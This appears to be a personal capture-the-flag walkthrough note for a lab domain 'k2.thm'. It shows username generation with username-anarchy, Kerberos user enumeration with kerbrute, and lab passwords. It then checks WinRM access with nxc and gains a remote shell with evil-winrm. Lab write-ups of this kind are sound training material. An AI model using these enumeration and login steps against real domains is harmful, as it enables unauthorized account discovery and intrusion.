You have the full names of `James Bold` and `Rose Bud` along with three different passwords.

## Username Anarchy

This is tool for generating usernames when penetration testing. _Usernames are half the password brute force problem._ More info [here](https://github.com/urbanadventurer/username-anarchy).

#Attaking_Machine 
1. Installing.
```
git clone https://github.com/urbanadventurer/username-anarchy.git
```

2. Create a file `names.txt` with the `James Bold` and `Rose Bud` names.
3. Go to the `username-anarchy`. 
4. Run:
```
./username-anarchy --input-file ../names.txt| tee ../possible_users.txt
```

You'll get a file called `possible_users.txt` in the parent directory with the following content.

![[posible_users-1.png]]

## Keybrute

#Attaking_Machine 
1. Use a tool called [Kerbute](https://github.com/ropnop/kerbrute) to validate any usernames.

```
/home/kali/tools/kerbrute_linux_amd64 userenum --dc <target IP> -d k2.thm -o valid_users.txt possible_users.txt
```

![[kerbrute.png]]

2. Create a file called `users.txt` and copy both users.

> **How this Works**  
A TGT request is made through an AS-REQ message. When an invalid username is requested, the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN in the AS-REP message. When working with a valid username, either a TGT will be obtained, or an error like KRB5KDC_ERR_PREAUTH_REQUIRED will be raised (i.e. in this case, indicating that the user is required to perform preauthentication).


## Passwords

Create a file called `passwords.txt` with the passwords found on [[Other Questions]].

`Pwd@9tLNrC3!`
`vRMkaVgdfxhW!8`



## NetExec

NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of _large_ networks. More info [NetExec](https://github.com/Pennyw0rth/NetExec).

#Attaking_Machine 

1. Run the following command to check whether this user has access via `winrm`.
```
nxc winrm <MACHINE IP> -u r.bud -p '`vRMkaVgdfxhW!8`
```

![[winrm 1.png]]

2. Connect via `evil-winrm`.

```
evil-winrm -i <target IP> -u r.bud -p 'vRMkaVgdfxhW!8'  
```

![[evilwinrm.png]]

**Next step:** [[Shell as R.Bud]]
